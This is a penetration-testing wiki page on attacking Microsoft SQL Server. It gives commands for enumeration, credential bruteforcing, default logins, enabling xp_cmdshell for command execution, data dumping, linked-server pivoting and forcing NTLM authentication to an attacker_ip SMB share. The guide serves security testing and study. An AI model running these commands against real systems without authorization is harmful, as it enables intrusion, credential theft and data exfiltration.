---
authors: ShutdownRepo, felixbillieres
category: infra
---

# MSSQL

## Theory

Microsoft SQL Server (MSSQL) is a relational database management system developed by Microsoft. It uses the Tabular Data Stream (TDS) protocol for client-server communication and typically runs on port `1433/TCP`. MSSQL supports Windows Authentication (integrated security) and SQL Server Authentication (username/password).

MSSQL databases are commonly found in enterprise environments and can contain sensitive information. Exploiting MSSQL can lead to:
* Data exfiltration
* Command execution on the database server
* Lateral movement within the network
* Privilege escalation

## Enumeration

### Port scanning

MSSQL typically runs on port `1433/TCP`, but it can be configured to run on custom ports. MSSQL also uses UDP port `1434` for the SQL Browser service, which helps discover SQL Server instances and named instances.

```bash
# Basic port scan
nmap -p 1433 $TARGET

# Service version detection
nmap -p 1433 -sV $TARGET

# Scan SQL Browser service (UDP 1434)
nmap -sU -p 1434 $TARGET
```

### Banner grabbing

```bash
# Using nc
nc -vn $TARGET 1433

# Using nmap
nmap -p 1433 -sV $TARGET
```

> [!NOTE]
> Banner grabbing via `nc` may be unreliable because MSSQL uses the TDS protocol which requires a proper handshake. Sometimes you'll see version information, but sometimes `nc` shows nothing or closes immediately. Use `nmap` for more reliable results.

## Authentication

MSSQL supports two authentication methods:
* **Windows Authentication**: Uses Windows credentials (Kerberos/NTLM). When using tools like NetExec, this defaults to NTLM authentication (not Windows Kerberos) unless `--local-auth` is specified.
* **SQL Server Authentication**: Uses SQL Server login credentials (username/password). Requires the `--local-auth` flag in NetExec to explicitly use this authentication method.

> [!TIP]
> It's important to distinguish between Windows Authentication and SQL Server Authentication. Use `--local-auth` in NetExec when authenticating with SQL Server credentials, otherwise NetExec will attempt Windows Authentication (NTLM by default).

### Authentication enumeration

Check if SQL Server Authentication is enabled and enumerate authentication methods.

```bash
# Check if SQL Server Authentication is enabled
nmap -p 1433 --script ms-sql-info $TARGET
```

### Default credentials

Historically, MSSQL used `sa` / `sa` as default credentials, but since SQL Server 2005, Microsoft forces password selection during installation. Default credentials are mainly found on:

* Old SQL Server versions (pre-2005)
* Development environments
* Negligent administrator configurations

Common default credentials to test:
* `sa` / `sa`
* `sa` / `<empty>`
* `admin` / `admin`
* `administrator` / `administrator`

### Bruteforce

::: tabs

=== Hydra

```bash
hydra -l sa -P /path/to/passwords.txt $TARGET mssql
```

=== Metasploit

```bash
msfconsole
use auxiliary/scanner/mssql/mssql_login
set RHOSTS $TARGET
set USERNAME sa
set PASS_FILE /path/to/passwords.txt
run
```

=== Nmap

```bash
nmap -p 1433 --script ms-sql-brute --script-args userdb=/path/to/users.txt,passdb=/path/to/passwords.txt $TARGET
```

=== NetExec

[NetExec](https://github.com/Pennyw0rth/NetExec) can bruteforce MSSQL credentials.

```bash
netexec mssql $TARGET -u sa -p /path/to/passwords.txt
```

:::

### Windows Authentication

If MSSQL is configured for Windows Authentication, you can use Windows credentials or Kerberos tickets.

```bash
# With Windows credentials
mssqlclient.py -p 1433 'DOMAIN/username:password'@'$TARGET' -windows-auth

# With Kerberos ticket
export KRB5CCNAME=/path/to/ticket.ccache
mssqlclient.py -p 1433 'DOMAIN/username'@'$TARGET' -windows-auth -k
```

## Database enumeration

Once authenticated, enumerate databases, tables, and users.

::: tabs

=== mssqlclient.py

[Impacket](https://github.com/fortra/impacket)'s [mssqlclient.py](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) (Python) provides an interactive MSSQL console.

```bash
# Connect with SQL authentication
mssqlclient.py -p 1433 'username'@'$TARGET'

# Connect with Windows authentication
mssqlclient.py -p 1433 'DOMAIN/username'@'$TARGET' -windows-auth

# Connect with password
mssqlclient.py -p 1433 'username:password'@'$TARGET'
```

Once connected, useful commands:

```sql
-- List databases
SELECT name FROM sys.databases;

-- List tables in current database
SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;

-- List columns in a table
SELECT COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users';

-- List users
SELECT name FROM sys.server_principals WHERE type_desc = 'SQL_LOGIN';

-- Check current user permissions
SELECT * FROM fn_my_permissions(NULL, 'SERVER');

-- Check if xp_cmdshell is enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
```

=== sqsh

[sqsh](https://sourceforge.net/projects/sqsh/) is a command-line tool for querying MSSQL databases.

```bash
# Connect
sqsh -S $TARGET -U username -P password

# Execute query
sqsh -S $TARGET -U username -P password -C "SELECT @@version"
```

=== sqlcmd

[sqlcmd](https://docs.microsoft.com/en-us/sql/tools/sqlcmd-utility) is Microsoft's command-line tool for MSSQL.

```bash
# Connect
sqlcmd -S $TARGET -U username -P password

# Execute query
sqlcmd -S $TARGET -U username -P password -Q "SELECT @@version"
```

=== NetExec

[NetExec](https://github.com/Pennyw0rth/NetExec) can interact with MSSQL databases and provides enumeration modules.

```bash
# Execute SQL query (use --local-auth for SQL Server Authentication)
netexec mssql $TARGET -u username -p password -q "SELECT @@version"

# Query databases
netexec mssql $TARGET -u username -p password -q "SELECT name FROM sys.databases;"

# Enumerate users that can be impersonated
netexec mssql $TARGET -u username -p password -M enum_impersonate

# Enumerate active MSSQL logins
netexec mssql $TARGET -u username -p password -M enum_logins

# RID brute force to enumerate users (only works if MSSQL runs on a Windows Domain Controller or if MSSQL exposes SAM lookup)
netexec mssql $TARGET -u username -p password --rid-brute
```

:::

## Exploitation

### Command execution

MSSQL can execute operating system commands through stored procedures if the appropriate permissions are granted.

::: tabs

=== xp_cmdshell

`xp_cmdshell` is a stored procedure that allows executing Windows commands. It requires `sysadmin` role or explicit permissions. **xp_cmdshell is disabled by default since SQL Server 2005** and must be explicitly enabled.

```sql
-- Enable xp_cmdshell (requires sysadmin)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute command
EXEC xp_cmdshell 'whoami';

-- Disable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;
```

> [!CAUTION]
> xp_cmdshell execution is logged and can be detected by security monitoring.

=== NetExec

[NetExec](https://github.com/Pennyw0rth/NetExec) can use xp_cmdshell to execute commands on the remote host.

```bash
# Execute command using xp_cmdshell
netexec mssql $TARGET -u sa -p 'password' -x whoami

# Enable xp_cmdshell via SQL query
netexec mssql $TARGET -u sa -p 'password' -q "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
```

=== sp_OACreate

`sp_OACreate` can be used to execute commands through COM objects. This requires `sysadmin` role and Ole Automation Procedures to be enabled. **Note**: Ole Automation Procedures are disabled by default on SQL Server 2017/2019 and may not work if certain security policies are enabled.

```sql
-- Enable Ole Automation Procedures
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;

-- Execute command using WScript.Shell
DECLARE @shell INT;
EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'Run', NULL, 'cmd.exe /c whoami > C:\temp\output.txt';
EXEC sp_OADestroy @shell;
```

:::

### Data exfiltration

Extract sensitive data from databases.

```sql
-- List all databases
SELECT name FROM sys.databases;

-- Switch to a database
USE database_name;

-- List tables
SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;

-- Extract data from a table
SELECT * FROM users;

-- Export data to file using bcp (requires appropriate permissions and bcp tool installed on server)
EXEC xp_cmdshell 'bcp "SELECT * FROM database.dbo.users" queryout C:\temp\users.txt -c -T';
```

> [!NOTE]
> The `bcp` (Bulk Copy Program) utility must be installed on the SQL Server for this command to work. This is not always the case, so this method depends on the server configuration.

### Linked servers

MSSQL can be configured with linked servers to access other databases. This can be exploited for lateral movement.

::: tabs

=== SQL queries

```sql
-- List linked servers
SELECT * FROM sys.servers;

-- Query linked server
SELECT * FROM OPENQUERY(linked_server, 'SELECT @@version');

-- Enable RPC OUT on linked server (required for command execution on some servers)
EXEC sp_serveroption 'linked_server_name', 'rpc out', 'true';
```

=== NetExec

[NetExec](https://github.com/Pennyw0rth/NetExec) provides modules to enumerate and interact with linked servers:

```bash
# Enumerate linked MSSQL servers
netexec mssql $TARGET -u username -p password -M enum_links

# Execute SQL queries on a linked server
netexec mssql $TARGET -u username -p password -M exec_on_link -o LINKED_SERVER="linked_server_name" -o QUERY="SELECT @@version"

# Enable/Disable xp_cmdshell on a linked server
netexec mssql $TARGET -u username -p password -M link_enable_cmdshell -o LINKED_SERVER="linked_server_name" -o ENABLE=true

# Execute shell commands on a linked server
netexec mssql $TARGET -u username -p password -M link_xpcmd -o LINKED_SERVER="linked_server_name" -o COMMAND="whoami"
```

:::

### UNC path injection and coercion

MSSQL can be used to force authentication to an attacker-controlled SMB server through UNC paths.

::: tabs

=== SQL queries

```sql
-- Force authentication to attacker SMB server
EXEC xp_dirtree '\\attacker_ip\share', 1, 1;

-- Or using xp_fileexist
EXEC xp_fileexist '\\attacker_ip\share\file.txt';
```

=== NetExec

[NetExec](https://github.com/Pennyw0rth/NetExec) can also be used to coerce authentication using MSSQL, similar to SMB coercion techniques:

```bash
# Coerce authentication using MSSQL
netexec mssql $TARGET -u username -p password -M mssql_coerce -o LISTENER="attacker_ip"
```

:::

> [!TIP]
> Use tools like [Responder](https://github.com/lgandx/Responder) or [Inveigh](https://github.com/Kevin-Robertson/Inveigh) to capture NTLM hashes from coerced connections.

## Navigation in database

### Useful SQL queries

```sql
-- Get SQL Server version
SELECT @@version;

-- Get current user
SELECT SYSTEM_USER;
SELECT USER_NAME();

-- Get server name
SELECT @@SERVERNAME;

-- List databases
SELECT name, database_id, create_date FROM sys.databases;

-- Get current database
SELECT DB_NAME();

-- List tables in current database
SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;

-- List columns in a specific table
SELECT COLUMN_NAME, DATA_TYPE, IS_NULLABLE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'table_name';

-- Count rows in a table
SELECT COUNT(*) FROM table_name;

-- Search for specific data
SELECT * FROM table_name WHERE column_name LIKE '%search_term%';

-- List stored procedures
SELECT ROUTINE_SCHEMA, ROUTINE_NAME FROM INFORMATION_SCHEMA.ROUTINES WHERE ROUTINE_TYPE = 'PROCEDURE';

-- List functions
SELECT ROUTINE_SCHEMA, ROUTINE_NAME FROM INFORMATION_SCHEMA.ROUTINES WHERE ROUTINE_TYPE = 'FUNCTION';

-- Check user permissions
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');

-- List users and roles
SELECT name, type_desc, is_disabled FROM sys.server_principals WHERE type IN ('S', 'U', 'G');

-- List database users
SELECT name, type_desc FROM sys.database_principals;

-- Check if user is sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');

-- List SQL Server logins
SELECT name, type_desc, is_disabled, create_date FROM sys.server_principals WHERE type_desc = 'SQL_LOGIN';

-- Check users that can be impersonated
SELECT 
    p.name AS principal_name,
    p.type_desc AS principal_type,
    p.is_disabled,
    pr.name AS permission_name
FROM sys.server_principals p
INNER JOIN sys.server_permissions pr ON p.principal_id = pr.grantee_principal_id
WHERE pr.permission_name = 'IMPERSONATE';
```

## Resources

[https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)

[https://github.com/fortra/impacket](https://github.com/fortra/impacket)

[https://www.netexec.wiki/](https://www.netexec.wiki/)
